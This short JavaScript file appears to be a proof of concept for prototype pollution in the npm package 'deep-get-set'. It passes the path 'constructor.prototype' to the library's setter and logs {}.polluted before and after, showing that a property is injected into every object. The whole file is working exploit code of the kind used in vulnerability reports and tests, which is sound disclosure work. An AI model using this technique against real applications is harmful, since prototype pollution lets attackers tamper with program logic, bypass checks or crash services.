var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const deep = require('deep-get-set');
console.log({}.polluted);
deep(obj, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);